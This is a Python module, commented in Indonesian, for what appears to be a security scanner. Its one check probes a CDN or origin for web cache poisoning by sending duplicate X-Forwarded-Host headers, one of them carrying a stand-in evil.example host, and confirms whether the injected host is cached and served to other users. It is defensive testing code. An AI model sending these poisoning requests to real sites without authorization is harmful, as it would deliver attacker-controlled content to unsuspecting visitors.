"""
CacheAdv v1 — Cache/CDN Attack generasi baru untuk VANTHEX (v1.9.0).
AUTHORIZED TESTING ONLY — dengan cache-buster, tak mengotori cache
asli (kasus fixture/lab).

Deteksi:
- Web cache poisoning via normalisasi header (X-Forwarded-Host:
  server mengambil header TERAKHIR / dipisah koma secara salah)
- Cache key normalization bug (path // / ; / %2f dinormalisasi beda
  antara cache dan origin)
Semua probe pakai query unik (cb=<rand>) supaya tidak mengganggu
cache production asli.
"""
import random as _random
import urllib.parse as _up

from exploitkit import _F

_POISON_MARKER = "poisoned-vhx-"


def _probe_cache(ctx, ep, headers=None):
    try:
        return ctx.client.get(ep, headers=headers or {})
    except Exception:
        return None


def c_cache_poisoning_v2(ctx, add):
    """Poisoning via header duplikat (X-Forwarded-Host ganda → server
    mengambil yang terakhir) — refleksi host musuh di respons yang
    DI-CACHE untuk pengguna lain. Kontrol /safe/cdn/cache: abaikan
    header (tidak bisa dipoison)."""
    cb = str(_random.Random().randbytes(4).hex())
    ep = f"/cdn/cache?cb={cb}"
    # baseline: respons normal
    r0 = _probe_cache(ctx, ep)
    if r0 is None or r0.status != 200:
        return
    # probe poisoning: dua XFH — yang kedua jahat
    evil_host = _POISON_MARKER + cb + ".evil.example"
    rp = None
    try:
        rp = ctx.client.get(ep + "&p=2",
                            headers=[("X-Forwarded-Host", "internal.local"),
                                     ("X-Forwarded-Host", evil_host)])
    except Exception:
        return
    if rp is None:
        return
    poisoned_now = evil_host in (rp.body or "")
    # verifikasi persistensi cache: request TANPA header jahat
    rv = _probe_cache(ctx, ep + "&v=verify")
    cached_for_others = rv is not None and evil_host in (rv.body or "")
    if not (poisoned_now or cached_for_others):
        return
    # kontrol safe
    rs = None
    try:
        rs = ctx.client.get("/safe/cdn/cache?cb=" + cb,
                            headers=[("X-Forwarded-Host", "internal.local"),
                                     ("X-Forwarded-Host", evil_host)])
    except Exception:
        pass
    if rs is not None and evil_host in (rs.body or ""):
        ctx.L("  [cache] kontrol /safe juga bisa dipoison — bukan sasaran")
        return
    add(_F("HIGH",
           "Web Cache Poisoning via Normalisasi Header Duplikat",
           f"CDN/origin mengambil X-Forwarded-Host TERAKHIR dari header "
           f"duplikat dan mencache hasilnya — konten ber-host musuh "
           f"({evil_host[:30]}...) tersaji ke pengguna lain "
           f"({'terkonfirmasi tersaji dari cache' if cached_for_others else 'poisoning langsung terbukti'}).",
           evidence=f"poisoned_now={poisoned_now}; "
                    f"cached_for_others={cached_for_others}; /safe immune",
           cwe="CWE-444", owasp="A05:2021 Security Misconfiguration",
           cvss=7.8, location="/cdn/cache", param="X-Forwarded-Host",
           remed="Normalisasi header ketat (ambil yang pertama / tolak "
                 "duplikat), key cache menyertakan host kanonik, "
                 "disable refleksi host tak-terdaftar.",
           confidence="confirmed"))
